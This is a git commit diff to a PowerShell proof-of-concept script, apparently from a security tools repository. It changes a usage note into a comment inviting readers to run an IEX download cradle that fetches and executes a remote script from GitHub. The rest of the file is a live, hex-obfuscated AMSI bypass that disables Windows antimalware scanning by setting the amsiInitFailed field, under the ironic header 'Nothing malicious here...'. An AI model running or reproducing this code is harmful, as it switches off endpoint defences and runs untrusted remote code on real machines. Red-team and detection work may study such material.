61478c7b8bbffbb521c41b55165d809bfc126211
jdksec <44243011+jdksec@users.noreply.github.com>
2024-03-06 15:39:02 +0000

    Update poc.ps1

--- encoded/poc.ps1
+++ encoded/poc.ps1
@@ -1,10 +1,8 @@
 # Nothing malicious here... 
 
-Please run the script with the following:
+#Please install my "handy" tool by running the following script in powershell:
 
-```
-IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/sharphound-2.ps1')
-```
+# IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/poc.ps1')
 
 [Ref].Assembly.GetType('System'+$("2E 4D 61 6E 61 67 65 6D 65 6E 74 2E 41 75 74 6F 6D 61 74 69 6F 6E 2E".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result1=$result1+$_};$result1)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 
